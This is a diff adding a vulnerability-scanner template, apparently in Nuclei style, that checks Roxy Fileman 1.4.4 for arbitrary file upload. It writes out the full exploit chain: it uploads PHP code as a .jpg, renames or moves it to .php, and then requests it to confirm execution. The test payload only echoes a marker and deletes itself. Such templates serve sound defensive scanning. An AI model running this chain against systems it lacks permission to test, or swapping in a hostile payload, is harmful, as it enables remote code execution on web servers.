@@ -1,0 +1,113 @@
+id: roxyfileman-fileupload
+brief:
+    title: Roxy Fileman 1.4.4 - Arbitrary File Upload
+    by: DhiyaneshDK
+    level: high
+    about: Roxy Fileman 1.4.4 is susceptible to remote code execution via the FORBIDDEN_UPLOADS setting, which is checked when renaming an existing file to a new file extension. An attacker can bypass this ch...
+    label:
+        - misconfig
+        - edb
+        - roxy
+        - fileman
+        - rce
+        - fileupload
+        - intrusive
+        - vuln
+    score: CVSS:8.8
+moves:
+    - verb: POST
+      to:
+        - '{{BaseURL}}/php/upload.php'
+      head:
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary6rbEqFAMRkE0RAB7
+      body: |-
+        ------WebKitFormBoundary6rbEqFAMRkE0RAB7
+        Content-Disposition: form-data; name="action"
+
+        upload
+        ------WebKitFormBoundary6rbEqFAMRkE0RAB7
+        Content-Disposition: form-data; name="method"
+
+        ajax
+        ------WebKitFormBoundary6rbEqFAMRkE0RAB7
+        Content-Disposition: form-data; name="d"
+
+        /app/Uploads
+        ------WebKitFormBoundary6rbEqFAMRkE0RAB7
+        Content-Disposition: form-data; name="files[]"; filename="{{randstr}}.jpg"
+        Content-Type: image/jpeg
+
+        <?php
+        echo md5('roxyfileman-fileupload');unlink(__FILE__);
+        ?>
+
+        ------WebKitFormBoundary6rbEqFAMRkE0RAB7--
+      signs:
+        - "on": word
+          has:
+            - 99acb46eabd01958e22fae1792e83ca9
+          in: body
+        - "on": word
+          has:
+            - text/html
+          in: header
+          need: all
+        - "on": status
+          status:
+            - 200
+    - verb: POST
+      to:
+        - '{{BaseURL}}/php/renamefile.php?f=%2Fapp%2FUploads%2F{{randstr}}.jpg&n={{randstr}}.php'
+      head:
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+        X-Requested-With: XMLHttpRequest
+      body: f=%2Fapp%2FUploads%2F{{randstr}}.jpg&n={{randstr}}.php
+      signs:
+        - "on": word
+          has:
+            - 99acb46eabd01958e22fae1792e83ca9
+          in: body
+        - "on": word
+          has:
+            - text/html
+          in: header
+          need: all
+        - "on": status
+          status:
+            - 200
+    - verb: POST
+      to:
+        - '{{BaseURL}}/php/movefile.php?f=%2Fapp%2FUploads%2F{{randstr}}.jpg&n=%2Fapp%2FUploads%2F{{randstr}}.php'
+      head:
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+        X-Requested-With: XMLHttpRequest
+      body: f=%2Fapp%2FUploads%2F{{randstr}}.jpg&n=%2Fapp%2FUploads%2F{{randstr}}.php
+      signs:
+        - "on": word
+          has:
+            - 99acb46eabd01958e22fae1792e83ca9
+          in: body
+        - "on": word
+          has:
+            - text/html
+          in: header
+          need: all
+        - "on": status
+          status:
+            - 200
+    - verb: GET
+      to:
+        - '{{BaseURL}}/Uploads/{{randstr}}.php'
+      signs:
+        - "on": word
+          has:
+            - 99acb46eabd01958e22fae1792e83ca9
+          in: body
+        - "on": word
+          has:
+            - text/html
+          in: header
+          need: all
+        - "on": status
+          status:
+            - 200
